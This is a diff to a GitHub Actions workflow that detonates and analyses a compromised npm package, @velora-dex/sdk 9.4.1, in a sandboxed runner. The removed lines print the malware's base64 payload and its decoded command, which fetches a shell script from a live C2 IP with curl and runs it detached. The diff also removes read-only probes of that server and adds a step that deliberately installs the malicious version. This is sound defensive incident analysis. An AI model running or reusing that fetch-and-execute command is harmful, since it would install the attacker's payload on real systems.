@@ -6,9 +6,8 @@ on:
 permissions: read-all
 
 jobs:
-  analyze-velora-dex-sdk:
+  download-package:
     runs-on: ubuntu-latest
-
     steps:
       - name: Harden the runner (Audit all outbound calls)
         uses: step-security/harden-runner@v2
@@ -20,92 +19,38 @@ jobs:
         with:
           node-version: "20"
 
-      - name: Download compromised and clean versions
+      - name: Download compromised and clean tarballs
         run: |
           mkdir -p /tmp/packages
           cd /tmp/packages
-          echo "=== Downloading compromised version 9.4.1 ==="
           npm pack @velora-dex/sdk@9.4.1 || true
-          echo ""
-          echo "=== Downloading clean version 9.4.0 ==="
           npm pack @velora-dex/sdk@9.4.0 || true
 
-      - name: Extract packages
-        run: |
-          cd /tmp/packages
-          mkdir -p v941 v940
+      - name: Upload package tarballs
+        uses: actions/upload-artifact@v4
+        with:
+          name: velora-dex-sdk-tarballs
+          path: /tmp/packages/*.tgz
+          retention-days: 90
 
-          for f in velora-dex-sdk-9.4.1.tgz veloradex-sdk-9.4.1.tgz; do
-            [ -f "$f" ] && tar xzf "$f" -C v941 --strip-components=1 && break
-          done
+  install-compromised-package:
+    runs-on: ubuntu-latest
+    needs: download-package
+    steps:
+      - name: Harden the runner (Audit all outbound calls)
+        uses: step-security/harden-runner@v2
+        with:
+          egress-policy: audit
 
-          for f in velora-dex-sdk-9.4.0.tgz veloradex-sdk-9.4.0.tgz; do
-            [ -f "$f" ] && tar xzf "$f" -C v940 --strip-components=1 && break
-          done
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: "20"
 
-          echo "=== v9.4.1 file listing ==="
-          find v941 -type f | head -30
-          echo ""
-          echo "=== v9.4.0 file listing ==="
-          find v940 -type f | head -30
-
-      - name: Diff compromised vs clean dist/index.js
-        run: |
-          cd /tmp/packages
-          echo "=== Diff of dist/index.js (9.4.0 vs 9.4.1) ==="
-          diff v940/dist/index.js v941/dist/index.js | head -60 || true
-          echo ""
-          echo "=== Diff of package.json ==="
-          diff v940/package.json v941/package.json || true
-
-      - name: Show injected malicious payload
-        run: |
-          cd /tmp/packages
-          echo "=== First 20 lines of compromised dist/index.js ==="
-          head -20 v941/dist/index.js
-          echo ""
-          echo "=== Decode base64 payload ==="
-          echo 'bm9odXAgYmFzaCAtYyAiJChjdXJsIC1mc1NMIGh0dHA6Ly84OS4zNi4yMjQuNS90cm91Ymxlc2hvb3QvbWFjL2luc3RhbGwuc2gpIiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d
-          echo ""
-          echo ""
-          echo "=== Decoded command ==="
-          echo 'nohup bash -c "$(curl -fsSL http://89.36.224.5/troubleshoot/mac/install.sh)" > /dev/null 2>&1'
-
-      - name: Analyze malicious payload structure
-        run: |
-          echo "=== PAYLOAD ANALYSIS ==="
-          echo ""
-          echo "Injection point: dist/index.js (package main entry)"
-          echo "Trigger: require('@velora-dex/sdk') or any import"
-          echo "No install hooks needed - executes on first import"
-          echo ""
-          echo "Execution chain:"
-          echo "  1. child_process.exec() called inline"
-          echo "  2. Base64-decodes embedded command"
-          echo "  3. Runs: nohup bash -c \"\$(curl -fsSL http://89.36.224.5/troubleshoot/mac/install.sh)\" > /dev/null 2>&1"
-          echo "  4. Fetches shell script from C2 server"
-          echo "  5. Runs detached (nohup) with all output suppressed"
-          echo ""
-          echo "C2 server: 89.36.224.5"
-          echo "Payload URL: http://89.36.224.5/troubleshoot/mac/install.sh"
-          echo "Target: macOS dev machines (/mac/ path), but runs on Linux CI too"
-
-      - name: Probe C2 endpoint (read-only)
-        run: |
-          echo "=== Probing C2 server (HTTP HEAD only) ==="
-          echo "IP: 89.36.224.5"
-          echo ""
-          echo "--- HEAD http://89.36.224.5/ ---"
-          curl -sI --max-time 10 http://89.36.224.5/ 2>&1 || echo "Connection failed/timed out"
-          echo ""
-          echo "--- HEAD http://89.36.224.5/troubleshoot/mac/install.sh ---"
-          curl -sI --max-time 10 http://89.36.224.5/troubleshoot/mac/install.sh 2>&1 || echo "Connection failed/timed out"
-
-      - name: Install compromised package to trigger payload
+      - name: Install compromised package
         continue-on-error: true
         run: |
-          cd /tmp
-          mkdir -p victim-project && cd victim-project
+          mkdir -p /tmp/victim-project && cd /tmp/victim-project
           npm init -y
           npm install @velora-dex/sdk@9.4.1 2>&1 || true
 
@@ -117,14 +62,14 @@ jobs:
 
       - name: Wait for malware network activity
         run: |
-          echo "Waiting 120 seconds for malware network activity to complete..."
+          echo "Waiting 30 seconds for malware network activity..."
           echo "Harden Runner will capture all outbound connections."
-          sleep 120
+          sleep 30
 
       - name: Check for malware artifacts
         run: |
           echo "=== Check /tmp for dropped files ==="
-          ls -la /tmp/ | grep -v victim-project | grep -v packages || true
+          ls -la /tmp/ | grep -v victim-project || true
           echo ""
           echo "=== Check home directory for artifacts ==="
           ls -la ~/ | tail -20
@@ -137,38 +82,3 @@ jobs:
           echo "  - All outbound network connections (especially to 89.36.224.5)"
           echo "  - Process tree showing child_process.exec invocation"
           echo "  - Any downloaded payloads"
-
-      - name: Summary
-        run: |
-          echo "============================================="
-          echo "  VELORADEX SDK COMPROMISE ANALYSIS SUMMARY"
-          echo "============================================="
-          echo ""
-          echo "Issue: https://github.com/VeloraDEX/sdk/issues/233"
-          echo "Package: @velora-dex/sdk"
-          echo "Compromised version: 9.4.1 (published 2026-04-07)"
-          echo "Last clean version: 9.4.0"
-          echo "Ecosystem: npm"
-          echo ""
-          echo "ATTACK VECTOR:"
-          echo "  - Malicious code prepended to dist/index.js"
-          echo "  - No corresponding commit in source repo"
-          echo "  - Payload published directly to npm registry"
-          echo ""
-          echo "MALICIOUS BEHAVIOR:"
-          echo "  - Executes on require() / import (no install hook needed)"
-          echo "  - Base64-encoded shell command"
-          echo "  - Downloads and runs script from http://89.36.224.5/troubleshoot/mac/install.sh"
-          echo "  - Uses nohup to detach from parent process"
-          echo "  - Suppresses all stdout/stderr output"
-          echo ""
-          echo "IOCs:"
-          echo "  - C2 IP: 89.36.224.5"
-          echo "  - URL: http://89.36.224.5/troubleshoot/mac/install.sh"
-          echo "  - Base64: bm9odXAgYmFzaCAtYyAiJChjdXJsIC1mc1NMIGh0dHA6Ly84OS4zNi4yMjQuNS90cm91Ymxlc2hvb3QvbWFjL2luc3RhbGwuc2gpIiA+IC9kZXYvbnVsbCAyPiYx"
-          echo ""
-          echo "REMEDIATION:"
-          echo "  - Do NOT install or upgrade to @velora-dex/sdk@9.4.1"
-          echo "  - If already installed: treat machine and reachable secrets as compromised"
-          echo "  - Pin to 9.4.0 or earlier"
-          echo "  - Rotate all credentials accessible from affected machines"
